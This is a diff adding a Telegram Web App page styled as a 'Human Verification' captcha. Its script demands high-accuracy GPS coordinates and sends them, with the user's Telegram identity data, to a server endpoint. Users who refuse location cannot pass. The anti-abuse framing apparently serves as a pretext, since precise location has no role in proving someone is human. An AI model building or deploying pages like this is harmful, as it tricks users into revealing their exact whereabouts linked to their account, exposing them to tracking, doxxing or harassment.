@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Human Verification</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      background-color: var(--tg-theme-bg-color, #ffffff);
+      color: var(--tg-theme-text-color, #000000);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+      background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+      border-radius: 16px;
+      padding: 30px 20px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    .icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 15px;
+      line-height: 1.5;
+      color: var(--tg-theme-hint-color, #666);
+      margin-bottom: 25px;
+    }
+    button {
+      background-color: var(--tg-theme-button-color, #3390ec);
+      color: var(--tg-theme-button-text-color, #ffffff);
+      border: none;
+      border-radius: 8px;
+      padding: 14px 24px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: opacity 0.2s;
+    }
+    button:active {
+      opacity: 0.8;
+    }
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .loading {
+      display: none;
+      margin-top: 15px;
+      font-size: 14px;
+      color: var(--tg-theme-hint-color, #666);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="icon">🤖</div>
+    <h1>Security Check</h1>
+    <p>To prevent abuse and fraudulent requests, we need to verify you are human.<br><br>Please allow location access when prompted to complete the verification.</p>
+    
+    <button id="verifyBtn">Verify Me</button>
+    <div id="loading" class="loading">Locating and verifying... Please wait.</div>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    const btn = document.getElementById('verifyBtn');
+    const loading = document.getElementById('loading');
+
+    btn.addEventListener('click', () => {
+      btn.disabled = true;
+      loading.style.display = 'block';
+      
+      if (!navigator.geolocation) {
+        tg.showAlert("Geolocation is not supported by your browser. Please try from your phone.");
+        btn.disabled = false;
+        loading.style.display = 'none';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          
+          try {
+            const res = await fetch('/api/captcha-verify', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                initData: tg.initData,
+                lat: lat,
+                lon: lon
+              })
+            });
+            
+            const data = await res.json();
+            
+            if (res.ok && data.success) {
+              tg.showAlert("Verified Successfully!", () => {
+                tg.close();
+              });
+            } else {
+              tg.showAlert("Verification Failed: " + (data.error || "Unknown Error"));
+              btn.disabled = false;
+              loading.style.display = 'none';
+            }
+          } catch (e) {
+            tg.showAlert("Network Error: " + e.message);
+            btn.disabled = false;
+            loading.style.display = 'none';
+          }
+        },
+        (error) => {
+          let msg = "Failed to get location.";
+          if (error.code === 1) msg = "Location permission denied. You must allow location to use this bot.";
+          tg.showAlert(msg);
+          btn.disabled = false;
+          loading.style.display = 'none';
+        },
+        { timeout: 10000, enableHighAccuracy: true }
+      );
+    });
+  </script>
+</body>
+</html>
